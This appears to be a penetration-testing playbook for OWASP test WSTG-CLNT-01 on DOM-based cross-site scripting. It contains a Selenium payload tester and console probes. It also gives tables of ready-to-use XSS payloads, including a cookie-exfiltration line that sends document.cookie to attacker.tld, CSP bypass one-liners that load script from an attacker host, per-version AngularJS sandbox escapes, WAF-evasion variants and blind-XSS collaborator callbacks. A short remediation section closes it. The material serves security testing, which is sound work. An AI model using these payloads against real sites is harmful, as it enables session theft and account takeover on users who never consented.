---
name: wstg-clnt-01
description: "Testing for DOM-Based Cross Site Scripting"
category: client-side
owasp_id: WSTG-CLNT-01
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-79]
chains_with: [wstg-clnt-02, wstg-clnt-11]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-clnt-11: "DOM XSS sink fed by an unvalidated postMessage handler = cross-origin, near-zero-interaction script execution (attacker page just needs to embed the target in an iframe) — Critical session/account takeover"
---

# wstg-clnt-01

## Test ID

WSTG-CLNT-01

## Test Name

Testing for DOM-Based Cross Site Scripting

## High-Level Description

DOM-based XSS occurs when client-side JavaScript processes data from untrusted sources and writes it to the DOM without proper sanitization. Unlike reflected or stored XSS, the payload never reaches the server - the entire attack happens in the browser. This makes DOM XSS harder to detect with server-side security tools.

---

## What to Check

### Sources (User Input)

- [ ] document.URL
- [ ] document.location
- [ ] document.referrer
- [ ] window.location
- [ ] window.name
- [ ] localStorage/sessionStorage
- [ ] URL hash (location.hash)

### Sinks (Dangerous Functions)

- [ ] document.write()
- [ ] innerHTML/outerHTML
- [ ] eval()
- [ ] setTimeout/setInterval (with strings)
- [ ] jQuery.html()
- [ ] location.href
- [ ] element.src

---

## How to Test

### Step 1: Identify Sources and Sinks

```javascript
// Browser console - find potential DOM XSS patterns
// Search JavaScript files for dangerous patterns

// Common source patterns
const sources = [
  "location.hash",
  "location.search",
  "location.href",
  "document.URL",
  "document.referrer",
  "window.name",
  "localStorage",
  "sessionStorage",
]

// Common sink patterns
const sinks = [
  "innerHTML",
  "outerHTML",
  "document.write",
  "eval(",
  "setTimeout(",
  "setInterval(",
  ".html(",
  ".append(",
  "location.href",
  "location.replace",
]

console.log("Check JS files for these patterns")
```

### Step 2: Test URL-Based DOM XSS

```bash
#!/bin/bash
TARGET="https://target.com"

# Test hash-based XSS
payloads=(
    "#<script>alert(1)</script>"
    "#<img src=x onerror=alert(1)>"
    "#javascript:alert(1)"
    "#'-alert(1)-'"
    "#\"><script>alert(1)</script>"
)

for payload in "${payloads[@]}"; do
    echo "Testing: $TARGET/page$payload"
    # Open in browser and check console for execution
done

# Test query parameter XSS
curl -s "$TARGET/search?q=<script>alert(1)</script>" | grep -i "script"
```

### Step 3: DOM XSS Tester

```python
#!/usr/bin/env python3
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import UnexpectedAlertPresentException
import time

class DOMXSSTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

        # Setup headless browser
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--disable-xss-auditor')
        self.driver = webdriver.Chrome(options=options)

    def test_hash_xss(self, page_path):
        """Test hash-based DOM XSS"""
        print(f"[*] Testing hash-based XSS on {page_path}")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ]

        for payload in payloads:
            url = f"{self.base_url}{page_path}#{payload}"

            try:
                self.driver.get(url)
                time.sleep(1)

                # Check for alert
                try:
                    alert = self.driver.switch_to.alert
                    print(f"[VULN] DOM XSS via hash: {payload[:30]}")
                    alert.accept()
                    self.findings.append({
                        "type": "hash_xss",
                        "payload": payload,
                        "severity": "High"
                    })
                except:
                    pass

            except UnexpectedAlertPresentException:
                print(f"[VULN] DOM XSS triggered: {payload[:30]}")
                self.findings.append({
                    "type": "hash_xss",
                    "payload": payload,
                    "severity": "High"
                })

    def test_query_xss(self, page_path, param_name):
        """Test query parameter DOM XSS"""
        print(f"\n[*] Testing query param XSS: {param_name}")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img/src=x onerror=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
        ]

        for payload in payloads:
            url = f"{self.base_url}{page_path}?{param_name}={payload}"

            try:
                self.driver.get(url)
                time.sleep(1)

                try:
                    alert = self.driver.switch_to.alert
                    print(f"[VULN] DOM XSS via query: {payload[:30]}")
                    alert.accept()
                    self.findings.append({
                        "type": "query_xss",
                        "parameter": param_name,
                        "payload": payload,
                        "severity": "High"
                    })
                except:
                    pass

            except UnexpectedAlertPresentException:
                print(f"[VULN] DOM XSS triggered")
                self.findings.append({
                    "type": "query_xss",
                    "parameter": param_name,
                    "payload": payload,
                    "severity": "High"
                })

    def analyze_javascript(self, js_url):
        """Analyze JavaScript for DOM XSS patterns"""
        print(f"\n[*] Analyzing JavaScript: {js_url}")

        try:
            response = requests.get(js_url)
            js_code = response.text

            # Dangerous patterns
            patterns = {
                'innerHTML assignment': r'\.innerHTML\s*=',
                'document.write': r'document\.write\s*\(',
                'eval usage': r'eval\s*\(',
                'location.hash sink': r'location\.hash.*innerHTML',
                'jQuery html sink': r'\$\([^)]+\)\.html\s*\(',
            }

            import re
            for name, pattern in patterns.items():
                matches = re.findall(pattern, js_code)
                if matches:
                    print(f"  [WARN] Found {name}: {len(matches)} occurrences")

        except Exception as e:
            print(f"  [ERROR] {e}")

    def close(self):
        self.driver.quit()

    def generate_report(self):
        print("\n" + "="*50)
        print("DOM XSS TESTING REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo DOM XSS vulnerabilities found.")
            return

        print(f"\nVulnerabilities: {len(self.findings)}")
        for f in self.findings:
            print(f"\n  [{f['severity']}] {f['type']}")
            print(f"  Payload: {f['payload'][:50]}")

# Usage
tester = DOMXSSTester("https://target.com")
tester.test_hash_xss("/search")
tester.test_query_xss("/search", "q")
tester.analyze_javascript("https://target.com/main.js")
tester.generate_report()
tester.close()
```

### Step 4: Manual Browser Testing

```javascript
// Paste in browser console on target page

// Test 1: Check if hash is used unsafely
location.hash = "<img src=x onerror=alert('hash-xss')>"

// Test 2: Check postMessage handler
window.postMessage("<img src=x onerror=alert('postMessage')>", "*")

// Test 3: Check localStorage handling
localStorage.setItem("test", '<img src=x onerror=alert("storage")>')
location.reload()
```

---

## Tools

| Tool                   | Description               |
| ---------------------- | ------------------------- |
| **DOM Invader (Burp)** | Automated DOM XSS testing |
| **Browser DevTools**   | Manual analysis           |
| **Selenium**           | Automated browser testing |

---

## Example Commands/Payloads

### Ready-to-use DOM XSS payloads (adapt to `{target}`)

| Payload | Typical Sink |
| ------- | ------------ |
| `#<img src=x onerror=alert(document.domain)>` | `location.hash` → `innerHTML` |
| `#<svg onload=alert(document.domain)>` | `location.hash` → `innerHTML` |
| `javascript:alert(document.domain)` | `location.href` / `<a href>` sink |
| `"><script>alert(document.domain)</script>` | `document.write()` |
| `'-alert(document.domain)-'` | inline `eval()` / string concatenation sink |
| `<img src=x onerror=fetch('https://attacker.tld/c?c='+document.cookie)>` | data-exfiltration PoC via `innerHTML` |
| `{{constructor.constructor('alert(1)')()}}` | AngularJS client-side template injection sink |

### Manual source→sink probe (browser console)

```javascript
// Paste on https://{target}/page to fuzz common sources against document.write
;["location.hash", "location.search", "document.referrer", "window.name"].forEach((src) => {
  console.log(src, "=>", eval(src))
})
```

### DOM Invader / Burp

```
1. Enable Burp's embedded browser -> DOM Invader panel
2. Turn on all sinks (innerHTML, eval, document.write, jQuery.html, postMessage, WebSocket)
3. Click "Scan for DOM XSS" and canary-inject each identified source
4. Confirm exploitability by firing the auto-generated PoC URL against {target}
```

### Additional real-world sink patterns

| Sink | Payload / trigger | Note |
| ---- | ------------------ | ---- |
| `$.globalEval()` / `$.getScript()` | `<script>$.getScript("//attacker.tld/x")</script>` | jQuery executes fetched text as JS, bypassing `innerHTML`-focused filters |
| `Range.createContextualFragment()` | `range.createContextualFragment(source)` where `source` is tainted | Parses `<script>`/event-handler markup outside the normal `innerHTML` parser path — often missed by DOM XSS scanners |
| `document.domain` sink | `document.domain = location.hash.slice(1)` | Widens the effective origin, enabling same-site subdomain takeover of cookies/frames rather than direct script exec |
| Vue.js client-side template injection | `{{_c.constructor('alert(document.domain)')()}}` | Vue equivalent of the AngularJS CSTI sink above, when user input reaches a Vue template/`v-html` |
| `Function()` constructor via config JSON | `element.setAttribute('onclick', taintedValue)` then simulated click | Attribute-injection sink that only fires on user interaction — useful when `innerHTML` is filtered but `setAttribute` is not |

### CSP Bypass Techniques

A Content-Security-Policy that blocks the obvious `innerHTML`/`eval` sink doesn't always stop DOM XSS — check the exact directive value against these documented bypasses before concluding the finding is unexploitable.

| Requirement (CSP contains) | Bypass Payload | Notes |
| --------------------------- | --------------- | ----- |
| `script-src 'self' https://www.google.com https://www.youtube.com` | `<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>` | Abuse a JSONP endpoint on a domain already whitelisted in `script-src`. Other endpoints: `accounts.google.com/o/oauth2/revoke?callback=alert(1337)`, `translate.googleapis.com/$discovery/rest?version=v3&callback=alert()`, `youtube.com/oembed?callback=alert` — full list in [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) |
| `default-src 'self' 'unsafe-inline'` | Build an `<iframe>` pointed at a same-origin static resource (e.g. `/robots.txt`), then on `onload` inject a `<script src>` pointing off-site into that frame's document — the child frame's `default-src` inherits differently than expected | `f=document.createElement("iframe");f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//attacker.tld/csp.js';f.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);` |
| `'unsafe-inline'` or `'unsafe-eval'` present | Pull a remote script into a same-origin iframe sourced from an existing stylesheet link, defeating `script-src self`-only intent | `d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://attacker.tld";setTimeout(()=>f.contentWindow.document.head.append(s),1000)` |
| `script-src 'self'` (no `object-src` restriction) | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` | `object`/`embed` with a `data:` URI is not covered by `script-src`; decodes to `<script>alert(1)</script>` |
| `script-src 'self' data:` | `<script src="data:,alert(1)">/</script>` | Mozilla explicitly warns against allowing `data:` in `script-src` — treat as a P1 finding if seen |
| `script-src https://google.com 'unsafe-inline'` | `"/><script>alert(1);</script>` | `unsafe-inline` alone defeats the policy for any HTML-injection point regardless of the allow-list |
| `script-src 'nonce-RANDOM'` + a relatively-linked local script (`<script src='/path.js'>`) | Inject `<base href=http://attacker.tld>` so the relative `src` resolves off-site, then host your JS at the identical path (`http://attacker.tld/path.js`) | Works because `<base>` is not covered by most nonce policies and the browser re-resolves every relative URL against it |
| CSP header set via PHP `header()` and a warning can be triggered (1000+ `$_GET`/`$_POST` params, or 20+ `$_FILES`) | `GET /?xss=<script>alert(1)</script>&a&a&a...[repeated 1000x]` | `Cannot modify header information - headers already sent` fires before the `header()` call that sets CSP, so no CSP is sent at all on that response |

Tools: [gmsgadget.com](https://gmsgadget.com/) (script-gadget library for CSP/DOMPurify bypass), [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) (flags weak policies before you start hunting bypasses).

### XSS in Angular / AngularJS (Client-Side Template Injection)

When user input reaches an AngularJS template with `ng-app` present on a root element, `{{ }}` interpolation is evaluated as an Angular expression — this is Client-Side Template Injection (CSTI), a framework-specific DOM XSS sink distinct from the generic `innerHTML`/`eval` sinks above. AngularJS removed its expression sandbox entirely as of 1.6, so `constructor.constructor` works unconditionally on all versions ≥1.6; versions before that had a sandbox that required a version-specific escape.

**Detect first**: `{{7*7}}` rendering as `49` on the page confirms client-side template evaluation (fingerprint the exact AngularJS version from `angular.version` in the console, or the loaded `angular.js`/`angular.min.js` file, before picking a payload below).

| AngularJS Version | Payload |
| ------------------ | ------- |
| ≥ 1.6 (sandbox removed) / 1.0.1–1.1.5 / **Vue.js** | `{{constructor.constructor('alert(1)')()}}` |
| ≥ 1.6 (entity-encoded, evades naive `'`/`(`/`)` filters) | `{{[].pop.constructor&#40'alert(1)'&#41&#40&#41}}` |
| 1.6.0 | `{{0[a='constructor'][a]('alert(1)')()}}` · `{{$eval.constructor('alert(1)')()}}` · `{{$on.constructor('alert(1)')()}}` |
| 1.5.9 – 1.5.11 | Jan Horn's `$$phase`/`$digest` override chain — rebuilds `Function.apply` via `$evalAsync` AST injection (see full payload in reference below) |
| 1.5.0 – 1.5.8 | `{{x={'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}` |
| 1.4.0 – 1.4.9 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` |
| 1.3.20 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` |
| 1.3.19 | `{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}` |
| 1.3.3 – 1.3.18 | `{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}` |
| 1.3.1 – 1.3.2 | `{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)//');}}` |
| 1.2.24 – 1.2.29 | `{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='"+(y='if(!window.x)alert(window.x=1)')+eval(y)+"'");}}` |
| 1.2.19 – 1.2.23 | `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}` |
| 1.2.6 – 1.2.18 | `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}` |
| 1.2.2 – 1.2.5 | `{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window.x)alert(window.x=1)')+eval(y)+"'");}}` |
| 1.2.0 – 1.2.1 | `{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}` |

**Advanced bypasses (no quotes / no `constructor` string in the payload — for strict WAFs and quote-stripping filters)**:

```javascript
// No ' or " quotes
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}

// No quotes AND no literal "constructor" string
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}

// Documented Imperva WAF bypass - splits "constructor" and uses \u{} codepoint escapes inside a string
{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
```

**Blind XSS (out-of-band callback, for CSTI sinks not directly visible — logs, admin dashboards, support tickets rendered through Angular)**:

```javascript
// 1.0.1-1.1.5 and >1.6.0
{{constructor.constructor("var _=document.createElement('script');_.src='//YOUR-COLLABORATOR-DOMAIN/m';document.getElementsByTagName('body')[0].appendChild(_)")()}}

// Shorter form, same version range
{{$on.constructor("var _=document.createElement('script');_.src='//YOUR-COLLABORATOR-DOMAIN/m';document.getElementsByTagName('body')[0].appendChild(_)")()}}
```

Version-specific blind-XSS variants for 1.2.0 through 1.5.11 exist (Gareth Heyes / Jan Horn / Mathias Karlsson payloads) — see the full table in the PayloadsAllTheThings reference below when the fingerprinted version falls in that range.

**Automatic sanitization bypass (modern Angular 2+, code-review finding)**: Angular sanitizes all template-bound values by default, but a developer can explicitly opt out via `DomSanitizer`. Grep the app's bundled JS / TypeScript source for these calls — any one fed with unsanitized user input is a direct DOM XSS:

```javascript
bypassSecurityTrustHtml
bypassSecurityTrustScript
bypassSecurityTrustStyle
bypassSecurityTrustUrl
bypassSecurityTrustResourceUrl
```

```javascript
// Example vulnerable pattern
this.dangerousUrl = 'javascript:alert("Hi there")';
this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl); // now bound via [href] with no sanitization
```

---

## Remediation Guide

### Safe DOM Manipulation

```javascript
// UNSAFE - Direct HTML insertion
element.innerHTML = userInput

// SAFE - Text content (no HTML parsing)
element.textContent = userInput

// SAFE - Create elements programmatically
const div = document.createElement("div")
div.textContent = userInput
parent.appendChild(div)

// SAFE - Use DOMPurify for HTML
element.innerHTML = DOMPurify.sanitize(userInput)
```

### Avoid Dangerous Sinks

```javascript
// AVOID
eval(userInput)
document.write(userInput)
element.innerHTML = userInput

// USE INSTEAD
JSON.parse(userInput) // For JSON data
element.textContent = userInput // For text
```

---

## Risk Assessment

| Finding                    | CVSS | Severity |
| -------------------------- | ---- | -------- |
| DOM XSS via hash           | 6.1  | Medium   |
| DOM XSS via query param    | 6.1  | Medium   |
| DOM XSS with session theft | 8.1  | High     |

---

## CWE Categories

| CWE ID     | Title                                                       |
| ---------- | ----------------------------------------------------------- |
| **CWE-79** | Improper Neutralization of Input During Web Page Generation |


---

## References

- [OWASP WSTG - Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadsAllTheThings - CSP Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/4%20-%20CSP%20Bypass.md)
- [PayloadsAllTheThings - XSS in Angular](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md)
- [PortSwigger - DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)

---

## Checklist

```
[ ] Sources identified in JavaScript
[ ] Sinks identified in JavaScript
[ ] Hash-based XSS tested
[ ] Query parameter XSS tested
[ ] postMessage handlers tested
[ ] Storage-based XSS tested
[ ] CSP directives reviewed for known bypasses (JSONP, unsafe-inline, nonce+base, object-src data:)
[ ] Angular/AngularJS ng-app presence checked, CSTI ({{ }}) tested if present
[ ] Findings documented
```
